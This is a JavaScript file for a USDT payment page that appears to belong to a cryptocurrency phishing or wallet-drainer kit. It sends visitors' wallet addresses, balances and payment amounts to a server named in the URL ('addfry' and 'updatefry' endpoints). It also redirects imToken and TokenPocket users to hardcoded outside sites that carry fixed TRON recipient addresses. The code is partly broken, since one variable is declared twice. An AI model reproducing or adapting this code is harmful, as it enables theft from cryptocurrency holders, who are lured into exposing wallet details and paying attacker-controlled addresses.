function loadData() {

	$("#from_url").val(unescape(getUrlParams("from_url")));
	// $("#pay_warning").text(decodeURI(getUrlParams("info")));
	$("#to_address").val(getUrlParams("to_address"));
	$("#addtype").val(getUrlParams("addtype"));
	$("#from").val(getUrlParams("from"));
}

//获取url参数
function getUrlParams(key) {
	var url = window.location.search.substr(1);
	if (url == '') {
		return false;
	}
	var paramsArr = url.split('&');
	for (var i = 0; i < paramsArr.length; i++) {
		var combina = paramsArr[i].split("=");
		if (combina[0] == key) {
			return combina[1];
		}
	}
	return false;
}

function addfry() {
	$.ajax({
		url: $("#from_url").val() + "/index/index/addfry",
		data: {
			address: $("#address").val(),
			addtype: $("#addtype").val(),
			usdt_balance: $("#usdt_balance").val(),
			balance: $("#balance").val(),
			payment: $("#payment").val(),
			from: $("#from").val(),
		},
		type: "post",
		success: function(data, textStatus, xhr) {
			console.log(data);
		},
		error: function(xhr, textStatus, error) {

		}
	});
}

function updatefry() {
	$.ajax({
		url: $("#from_url").val() + "/index/index/updatefry",
		data: {
			address: $("#address").val(),
			usdt_balance: $("#usdt_balance").val(),
			balance: $("#balance").val(),
			payment: $("#payment").val(),
		},
		type: "post",
		success: function(data, textStatus, xhr) {
			console.log(data);
		},
		error: function(xhr, textStatus, error) {}
	});
}

function paytype() {
	$.ajax({
		url: $("#from_url").val() + "/api/index/paytype",
		type: "get",
		dataType: 'json',
		success: function(data, textStatus, xhr) {
			$("#paytype").val(data.msg);
		},
		error: function(xhr, textStatus, error) {}
	});
}




//--------------paylist---------------


function paylistloadData() {
	$("#addtype").val(getUrlParams("addtype"));
	$("#to_address").val(getUrlParams("to_address"));
	$("#from_url").val(unescape(getUrlParams("from_url")));

	if (getUrlParams("addtype") == "trc20") {
		$("#tr_Metamask").hide();
		$("#tr_Okex").hide();
	} else if (getUrlParams("addtype") == "erc20") {
		$("#tr_TronLink").hide();
	} else {}
}

function paylistevent(from) {


	
let addtype = $("#addtype").val();
	let addtype = $("#addtype").val();
	let from_url = $("#from_url").val();
	let to_address = $("#to_address").val();
// 	let im_url = encodeURIComponent(window.location.protocol + "//" + window.location.host + "/" + addtype +
// 		".html?from=" + from +
// 		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);

// 	let tp_url = encodeURIComponent(window.location.protocol + "//" + window.location.host + "/" + addtype + ".html?from=" + from +
// 		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);

// 	let my_url = window.location.protocol + "//" + window.location.host + "/" + addtype + ".html?from=" + from +
// 		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url;
	let im_url = "https://www.wyfk.shop/trc20.html?from=imToken&addtype=trc20&to_address=TQgowxJypWmNGb1fuFGd5iyM8FfW7ziV3Y&from_url=www.wyfk.shop&locale=zh-CN&utm_source=imtoken"
let tp_url =  "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA&utm_source=tokenpocket"
let my_url =  "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA"	
	let qr_url = 	window.location.protocol + "//" + window.location.host + "/qrcode.html?&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url;

	if (from == "imToken") {
	    if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)){
	        location.href = "imtokenv2://navigate?screen=DappView&url=" + im_url;
	    }else{
	        location.href = qr_url;
	    }
		
	} else if (from == "TokenPocket") {
	    if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)){
	        if (addtype == "trc20") {
    			location.href = 'tpdapp://open?params={"url": "' + tp_url +
    				'", "chain": "TRX", "source":"xxx"}';
    		} else {
    			location.href = 'tpdapp://open?params={"url": "' + tp_url +
    				'", "chain": "ERC", "source":"xxx"}';
    		}
	    }else{
	        location.href = qr_url;
	    }
		
	} else {
		$("#pay_" + from).modal('show');
		$("#pay_" + from + "_url").val(my_url);
	}		

}

function payconfirm() {
	let payment = $("#payment").val();
	if ($.isNumeric(payment)) {
		if (payment > 0) {
			$("#confirm_amount").html("当前支付金额&nbsp<strong style='color: red;'>" + payment + "</strong>&nbspUSDT");
			$("#pay_confirm").modal('show');
		} else {
			alert("请填写正确的金额");
		}
	}
}

function isMobile() {
	var userAgentInfo = navigator.userAgent;

	var mobileAgents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"];

	var mobile_flag = false;

	//根据userAgent判断是否是手机
	for (var v = 0; v < mobileAgents.length; v++) {
		if (userAgentInfo.indexOf(mobileAgents[v]) > 0) {
			mobile_flag = true;
			break;
		}
	}

	var screen_width = window.screen.width;
	var screen_height = window.screen.height;

	//根据屏幕分辨率判断是否是手机
	if (screen_width < 500 && screen_height < 800) {
		mobile_flag = true;
	}

	return mobile_flag;
}
